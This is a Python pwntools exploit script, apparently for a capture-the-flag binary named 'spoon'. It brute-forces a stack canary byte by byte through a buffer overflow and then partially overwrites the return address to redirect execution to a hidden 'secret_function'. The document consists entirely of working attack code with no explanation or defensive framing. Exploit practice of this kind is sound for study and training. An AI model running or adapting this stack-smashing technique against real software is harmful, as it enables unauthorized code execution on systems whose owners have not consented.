from pwn import *

context.arch = 'amd64'
context.os = 'linux'
io = process('./spoon')
'''
context.terminal = ['tmux', 'splitw', '-h']

io = gdb.debug('./spoon', gdbscript=
        '
        source /usr/local/share/gef/gef.py
        break secret_function
        continue'
        )
'''
print(io.recvregex(b'\n'))
io.sendline(b'5803290005')
#print(io.recvregex(b'\n'))
print(io.recvregex(b'\n'))
print(io.recvregex(b'\n'))
canary = b'\x00'
for i in range(90, 97):
    for j in range(0, 256):
        cur = j.to_bytes(1, 'little')
        #print(cur)
        io.sendline(str(i).encode())
        io.sendline(b'a'*87+ canary + cur)
        canary_row = io.recvuntil(b'characters?\n')
        #print(canary_row)
        if b'terminate' not in canary_row:
            print('yay')
            canary += cur
            break


print(b"Canary is " + canary)

p = b'a' * 87 + canary + b'a'*8+b'\xb4'


for j in range(14, 256, 16):
    cur = j.to_bytes(1, 'little')
    print(cur)
    io.sendline(str(len(p) + 2).encode())
    io.sendline(p + cur)
    print(io.recvregex(b'\n'))
    canary_row = io.recvregex(b'\n')
    print(canary_row)
    if b'secret' in canary_row:
        print('found secret')
        p += cur
        print(io.recvregex(b'\n'))
        print(io.recvregex(b'\n'))
            #print(p)
        break
    print(io.recvregex(b'\n'))
    #print(io.recvregex(b'\n'))
